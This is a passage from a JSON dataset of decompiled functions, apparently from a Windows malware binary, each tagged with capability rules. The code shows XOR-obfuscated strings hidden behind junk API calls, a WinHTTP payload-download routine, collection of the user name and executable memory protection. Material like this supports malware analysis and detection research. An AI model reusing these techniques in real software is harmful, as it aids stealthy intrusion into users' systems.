        "decompiled_code": "\nbool __cdecl fcn.00403951(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x0040398f:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.004041af(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x004039b3:\n            fcn.0040ba41();\n            goto code_r0x004039ba;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040ba41();\n            goto code_r0x0040398f;\n        }\n        if (uVar1 < 5) goto code_r0x004039b3;\n        if (*puVar2[1] == uVar1) {\ncode_r0x004039ba:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 317
    },
    "004039ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004039ca(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    ushort *puVar8;\n    uint var_424h;\n    uint lpszHeaders;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_100h;\n    uint lpdwBufferLength;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    uint *var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c5h;\n    uint var_c1h;\n    uint var_bdh;\n    uchar var_b9h;\n    uint var_b8h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uchar var_73h;\n    uint var_72h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    int32_t *var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t lpMultiByteStr;\n    uint var_3ch;\n    uint var_38h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint *var_14h;\n    uint var_10h;\n    int32_t hRequest;\n    uint var_8h;\n    \n    lpszHeaders._0_2_ = 0;\n    var_4ch = in_EDX;\n    lpMultiByteStr = in_ECX;\n    sub.ntdll.dll_memset(&lpszHeaders + 2, 0, 0xfe);\n    var_424h._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_424h + 2, 0, 0x206);\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_108h = 0x34367964;\n        var_104h = 0;\ncode_r0x00403a5f:\n        var_10ch = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_104h = 0;\ncode_r0x00403a55:\n            var_108h = 0x32337964;\n            goto code_r0x00403a5f;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_104h = 0x30;\n            goto code_r0x00403a55;\n        }\n    }\n    var_f0h = &var_10ch;\n    if (lpdwNumberOfBytesRead != NULL) {\n        var_f0h = lpdwNumberOfBytesRead;\n    }\n    iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    if (iVar2 == 0) {\n        return 3;\n    }\n    var_110h = 6;\n    lpdwNumberOfBytesAvailable = 0x1;\n    var_44h = 5;\n    if (*0x41ccbc == 0) {\n        var_b8h._0_1_ = 6;\n        var_ech = 0x6658547f;\n        var_e8h = 0x373d3214;\n        var_e4h = 0x545e6e0a;\n        var_e0h = 0x32416656;\n        var_dch = 0x6e483761;\n        var_d8h = 0x66175402;\n        var_d4h = 0x37033246;\n        var_d0h = 0x545c6e0f;\n        var_cch._0_2_ = 0x6653;\n        var_cch._2_1_ = 1;\n        stack0xffffff33 = 0x15372332;\n        var_c5h = 0x7954126e;\n        var_c1h = 0x74323a66;\n        var_bdh = 0x1c6e5037;\n        var_b9h = 0x54;\n        stack0xffffff45 = 0x74325566;\n        var_b3h = 0x5b6e3137;\n        var_afh = 0x58665954;\n        var_abh = 0x5d376032;\n        var_a7h = 0x4f54126e;\n        var_a3h = 0x60325866;\n        var_9fh = 0x126e5d37;\n        var_9bh = 0x18664554;\n        var_97h = 0x54376e32;\n        var_93h = 0x1954076e;\n        var_8fh = 0x7d325e66;\n        var_8bh = 0x756e4637;\n        var_87h = 0xd665254;\n        var_83h = 0x9373f32;\n        var_7fh._0_2_ = 0x1d6e;\n        var_7fh._2_1_ = 0x54;\n        var_7fh._3_1_ = 5;\n        var_7bh = 0x64325f66;\n        var_77h = 0x26e5637;\n        var_73h = 0x54;\n        stack0xffffff8b = 0x65325e66;\n        var_6dh = 0x746e4637;\n        var_69h = 0x1c665e54;\n        var_65h = 0x373132;\n        var_61h = 0x4f545d6e;\n        var_5dh = 0x66324166;\n        var_59h = 0x1c6e5337;\n        var_55h = 0x6e660754;\n        var_51h._0_1_ = 0x32;\n        hRequest = 0x66375432;\n        var_8h._0_1_ = 0x6e;\n        var_72h._0_1_ = var_b8h;\n        fcn.00401000(0x138);\n        puVar1 = lpdwNumberOfBytesRead;\n        iVar7 = 0;\n        iVar2 = &var_ech - lpdwNumberOfBytesRead;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (iVar3 != 0xc89620) {\n                *(iVar7 + puVar1) = *(&hRequest + iVar7 % var_44h) ^ (iVar7 + puVar1)[iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x9c);\n        *0x41ccbc = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(puVar1, 0, 0, 0, 0);\n        uVar4 = lpdwNumberOfBytesAvailable;\n        if (*0x41ccbc == 0) {\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar1);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            return uVar4;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41ccbc, 5000, 5000, 5000, 5000);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesRead = NULL;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, (iVar2 + 1) * 2);\n        lpdwNumberOfBytesRead = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        *lpdwNumberOfBytesRead = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesRead, iVar2 + 1)\n        ;\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41ccbc, lpdwNumberOfBytesRead, 0x50, 0);\n    var_38h._0_1_ = 5;\n    var_38h._1_1_ = 0x78;\n    var_38h._2_1_ = 0x27;\n    stack0xffffffc7 = 0x4733;\n    var_33h._0_2_ = 0x86d;\n    var_33h._2_2_ = 0x4053;\n    var_2fh._0_2_ = 0x5733;\n    var_2fh._2_2_ = 0x7c78;\n    var_2bh._0_2_ = 0x1c33;\n    var_2bh._2_2_ = 0x5d6d;\n    var_27h._0_2_ = 0x4053;\n    var_27h._2_2_ = 0x5733;\n    var_23h._0_2_ = 0x7678;\n    var_23h._2_2_ = 0x5733;\n    var_1fh._0_2_ = 0x576d;\n    var_1fh._2_2_ = 0x3353;\n    var_1bh._0_1_ = 0x33;\n    var_14h = 0x3353786d;\n    var_10h = CONCAT31(var_10h._1_3_, 0x33);\n    fcn.00401000(0x3c);\n    iVar2 = var_f4h;\n    iVar3 = 0;\n    iVar7 = &var_38h - var_f4h;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar5 != 0xb7decd) {\n            *(iVar3 + iVar2) = *(&var_14h + iVar3 % var_44h) ^ (iVar3 + iVar2)[iVar7];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar2, lpdwNumberOfBytesRead, 0x50);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesRead);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    if (lpMultiByteStr == 0) goto code_r0x00404186;\n    if (var_f0h == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_f0h);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, (iVar2 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, var_f0h, 0xffffffff, lpdwNumberOfBytesAvailable, iVar2 + 1);\n    }\n    var_48h = 0x450e3716;\n    var_44h = 0x3751311d;\n    var_14h = 0x454b3751;\n    var_10h = CONCAT22(var_10h._2_2_, 0x3149);\n    fcn.00401000(0x10);\n    puVar8 = lpdwNumberOfBytesRead;\n    iVar7 = 0;\n    iVar2 = &var_48h - lpdwNumberOfBytesRead;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x1a3a82) {\n            *(iVar7 + puVar8) = *(&var_14h + iVar7 % var_110h) ^ (iVar7 + puVar8)[iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                      (lpMultiByteStr, puVar8, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = iVar7;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    iVar2 = var_f4h;\n    if (iVar7 == 0) {\ncode_r0x00404162:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_118h = 0x3300;\n        var_114h = 8;\n        iVar3 = fcn.00409658();\n        if (iVar3 != 0) {\n            var_14h = &var_424h;\n            var_10h = 0;\n            stack0xffffffe4 = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar7, 0x26, &var_1bh + 3, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar7, 0x1f, &var_118h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(iVar7, 0x3f, &var_114h, 4);\n        if (arg_18h != 0) {\n            var_3ch = 0x30596434;\n            var_38h._0_1_ = 0x34;\n            var_38h._1_1_ = 0x31;\n            var_38h._2_1_ = 1;\n            stack0xffffffc7 = 0x5d64;\n            var_33h._0_2_ = 0x6030;\n            var_33h._2_2_ = 0x4631;\n            var_2fh._0_2_ = 0x5a64;\n            var_2fh._2_2_ = 0x2330;\n            var_2bh._0_2_ = 0x1231;\n            var_2bh._2_2_ = 0x5d64;\n            var_27h._0_2_ = 0x2930;\n            var_27h._2_2_ = 0x5b31;\n            var_23h._0_2_ = 0x1d64;\n            var_23h._2_2_ = 0x3e30;\n            var_1fh._0_2_ = 0x4b31;\n            var_1fh._2_2_ = 0x3864;\n            var_1bh._0_1_ = 0x30;\n            var_14h = 0x30386466;\n            var_10h = CONCAT22(var_10h._2_2_, 0x315a);\n            fcn.00401000(0x44);\n            puVar8 = lpdwNumberOfBytesAvailable;\n            iVar7 = 0;\n            iVar2 = &var_3ch - lpdwNumberOfBytesAvailable;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                if (iVar3 != 0xc5a7be) {\n                    *(iVar7 + puVar8) = *(&var_14h + iVar7 % var_110h) ^ (iVar7 + puVar8)[iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, puVar8, arg_18h);\n            uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            iVar7 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar4);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            iVar2 = var_f4h;\n            puVar8 = lpdwNumberOfBytesRead;\n        }\n        iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(iVar7, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar3 == 0) || (iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(iVar7, 0),  iVar3 == 0))\n        goto code_r0x00404162;\n        lpdwBufferLength = 4;\n        var_100h = 0;\n        var_f8h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar7, 0x20000005, 0, &var_100h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_100h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(iVar7, 0x20000013, 0, &var_f8h, &lpdwBufferLength, 0);\n        if ((var_f8h == 0xce) || (var_f8h == 200)) {\n            if (var_4ch[1] == 0) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_100h);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                *var_4ch = 0;\n                var_4ch[1] = iVar3;\n            }\n            arg_18h = var_4ch[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(iVar7, &lpdwNumberOfBytesAvailable);\n                if ((iVar3 == 0) ||\n                   (iVar3 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (iVar7, *var_4ch + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar3 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x00404168;\n                }\n                *var_4ch = *var_4ch + lpdwNumberOfBytesRead;\n                iVar3 = *var_4ch;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar3;\n            if ((*arg_10h == 0) || (iVar3 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x00404168:\n    if (iVar7 != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar7);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00404186:\n    uVar4 = lpdwNumberOfBytesAvailable;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return uVar4;\n}\n",
        "token_count": 4922
    },
    "0040433d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040433d(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int16_t *piVar7;\n    uint32_t in_EDX;\n    uint32_t uVar8;\n    code *pcVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar var_33h;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int16_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t lpFileName;\n    int32_t var_4h;\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x250);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (iVar4 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar4;\n    uVar3 = (*pcVar9)(0, 0x208);\n    lpFileName = (*pcVar2)(uVar3);\n    if (lpFileName == 0) goto code_r0x004045c6;\n    uVar3 = (*pcVar9)(0, 0x208);\n    lpMem = (*pcVar2)(uVar3);\n    if (lpMem != NULL) {\n        sub.ntdll.dll_memset(lpMem, 0, 0x208);\n        var_40h = 0x754d633d;\n        var_3ch = 0x67066157;\n        var_38h._0_2_ = 0x790d;\n        stack0xffffffc7 = 0x6763;\n        var_38h._2_1_ = 4;\n        var_33h = 0x75;\n        var_30h = 0x75676361;\n        var_2ch._0_1_ = 0x79;\n        fcn.00401000(0x1c);\n        piVar7 = var_24h;\n        iVar4 = &var_40h - var_24h;\n        iVar10 = 0;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            iVar11 = lpFileName;\n            if (iVar5 != 0x1d6f02) {\n                var_10h = 5;\n                *(iVar10 + piVar7) = *(&var_30h + iVar10 % 5) ^ (iVar10 + piVar7)[iVar4];\n            }\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0xe);\n        piVar6 = piVar7;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpFileName, 0x103 - (piVar6 - (piVar7 + 1) >> 1));\n        pcVar2 = _sym.imp.ntdll.dll_RtlRandom;\n        if (iVar4 == 0) {\ncode_r0x00404598:\n            uVar3 = (*pcVar9)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        else {\n            if (var_ch == 0) {\n                var_1ch = (*_sym.imp.ntdll.dll_RtlRandom)(arg_ch);\n                var_1ch = var_1ch & 0xff;\n                arg_8h = (*pcVar2)(arg_ch);\n                arg_8h = arg_8h & 0xff;\n                iVar11 = lpFileName;\n            }\n            var_ch = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar11, piVar7);\n            var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar11, lpFindFileData);\n            piVar6 = lpMem;\n            iVar4 = lpFindFileData;\n            if (var_10h == -1) goto code_r0x00404598;\n            var_20h = 0;\n            while ((var_20h <= var_1ch || (var_20h <= var_ch))) {\n                if ((var_20h == var_1ch) || (var_20h == var_ch)) {\n                    iVar10 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar4 + 0x2c, 0, 0x2e);\n                    uVar8 = 0;\n                    uVar12 = (iVar10 + (-0x2c - iVar4) >> 1) >> 1;\n                    if ((var_4h != 0) && (uVar8 = uVar12 - 4,  uVar12 < uVar8)) {\n                        uVar8 = 0;\n                    }\n                    if (4 < uVar12) {\n                        uVar12 = 4;\n                    }\n                    var_30h = piVar6 + 1;\n                    piVar7 = piVar6;\n                    do {\n                        iVar1 = *piVar7;\n                        piVar7 = piVar7 + 1;\n                    } while (iVar1 != var_28h);\n                    (*_sym.imp.ntdll.dll_wcsncat)(piVar6 + (piVar7 - var_30h >> 1), iVar4 + (uVar8 + 0x16) * 2, uVar12);\n                    var_4h = var_4h + uVar12;\n                }\n                uVar8 = var_20h;\n                iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_10h, iVar4);\n                if (iVar10 == 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, iVar4);\n                }\n                var_20h = uVar8 + 1;\n            }\n            var_20h = 1;\n            *arg_10h = piVar6;\n            piVar6[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_10h);\n            pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar7 = var_24h;\n        }\n        uVar3 = (*pcVar9)(0, piVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar4 = lpFindFileData;\n    }\n    uVar3 = (*pcVar9)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\ncode_r0x004045c6:\n    uVar3 = (*pcVar9)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return var_20h;\n}\n",
        "token_count": 1756
    },
    "00404fbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404fbc(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uchar *puVar12;\n    int32_t iVar13;\n    uint *puVar14;\n    uint var_354h;\n    uint var_14ch;\n    uint var_10ch;\n    uint var_cch;\n    uint var_c0h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_b0h = 0x208;\n    var_38h = 0;\n    iVar6 = fcn.0040484b();\n    if (iVar6 == 0) {\n        fcn.00404920();\n        fcn.0040dede();\n    }\n    do {\n        var_24h = 0xaea3ed09;\n        uVar11 = 0;\n        var_20h = 0x2993125a;\n        var_1ch = 0x3d75a3ff;\n        var_18h = 0x662d9d39;\n        var_14h._0_1_ = 4;\n        var_14h._1_1_ = 0xdf;\n        var_14h._2_1_ = 0x22;\n        var_14h._3_1_ = 9;\n        var_10h._0_1_ = 0xf0;\n        var_10h._1_2_ = 0x4f40;\n        var_10h._3_1_ = 200;\n        var_ch._0_1_ = 0x80;\n        var_ch._1_1_ = 0x6e;\n        var_ch._2_2_ = 0xdcfc;\n        do {\n            var_8h = (&var_24h)[uVar11];\n            var_4h = 0;\n            fcn.004094f9();\n            pcVar2 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            if (var_4h == 0) {\n                iVar6 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(\"3333\", 0x184, 0x40, &var_a0h);\n                if (iVar6 != 0) {\n                    fcn.0040b955();\n                    (*pcVar2)(\"3333\", 0x184, var_a0h, &var_a0h);\n                }\n                puVar12 = 0x41ccd0;\n                for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                fcn.00406f62();\n                puVar14 = &var_cch;\n                for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                puVar14 = &var_ach;\n                for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                puVar12 = 0x41ccc4;\n                for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                puVar14 = &var_354h;\n                for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                iVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameW)(&var_354h, &var_b0h);\n                var_3ch = 6;\n                if (iVar6 != 0) {\n                    var_14h._0_1_ = 6;\n                    var_1ch = 0x691b4939;\n                    var_18h = 0x493e5612;\n                    var_14h._1_1_ = 0x69;\n                    var_14h._2_1_ = 0x16;\n                    var_14h._3_1_ = 0x56;\n                    var_10h._0_1_ = 0x21;\n                    var_10h._1_2_ = 0xd49;\n                    var_10h._3_1_ = 0x69;\n                    var_ch._0_1_ = 0x57;\n                    var_ch._1_1_ = 0x56;\n                    var_8h = 0x6948496c;\n                    var_4h = CONCAT22(var_4h._2_2_, 0x5657);\n                    fcn.00401000(0x24);\n                    iVar6 = var_2ch;\n                    iVar13 = 0;\n                    iVar9 = &var_1ch - var_2ch;\n                    do {\n                        iVar7 = (*_sym.imp.USER32.dll_GetCapture)();\n                        if (iVar7 != 0xa269bb) {\n                            *(iVar13 + iVar6) = *(&var_8h + iVar13 % var_3ch) ^ (iVar13 + iVar6)[iVar9];\n                        }\n                        iVar13 = iVar13 + 1;\n                    } while (iVar13 < 0x12);\n                    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(iVar6, &var_354h);\n                    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                }\n                iVar6 = fcn.00408c8d();\n                var_50h = 5;\n                if (iVar6 != 0) {\n                    if (2 < var_cch._1_1_) {\n                        iVar6 = 0;\n                        if (0 < var_cch._1_1_ - 2) {\n                            do {\n                                *0x41ccc0 = *0x41ccc0 + (&var_c0h)[iVar6];\n                                iVar6 = iVar6 + 1;\n                            } while (iVar6 < var_cch._1_1_ - 2);\n                        }\n                    }\n                    *0x41ccc0 = *0x41ccc0 ^ 0x43103655;\n                    iVar6 = fcn.004045dd();\n                    if (iVar6 != 0) {\n                        if (*0x41cd44 < 6) {\n                            var_94h = 0x7d724323;\n                            var_90h = 0x19302853;\n                            var_8ch = 0x38205370;\n                            var_88h = 0x25530261;\n                            var_84h = 0x2c11733e;\n                            var_80h = 0x7a13365c;\n                            var_7ch = 0x1b3e5c21;\n                            var_78h = 0x385c5302;\n                            var_74h = 0x26401014;\n                            var_70h = 0x2b701542;\n                            var_6ch = 0x781d422e;\n                            var_68h = 0x1b425c53;\n                            var_64h = 0x384f416c;\n                            var_60h = 0x24217661;\n                            var_5ch = 0x297e6130;\n                            var_58h = 0x7b61425c;\n                            var_54h._0_2_ = 0x4e29;\n                            var_54h._2_1_ = 0x79;\n                            var_34h = 0x395a7967;\n                            var_30h._0_1_ = 0x68;\n                            fcn.00401000(0x43);\n                            iVar6 = 0;\n                            do {\n                                iVar9 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                                if (iVar9 != 0x16046) {\n                                    *(iVar6 + var_2ch) =\n                                         *(&var_34h + iVar6 % var_50h) ^ (iVar6 + var_2ch)[&var_94h - var_2ch];\n                                }\n                                iVar6 = iVar6 + 1;\n                            } while 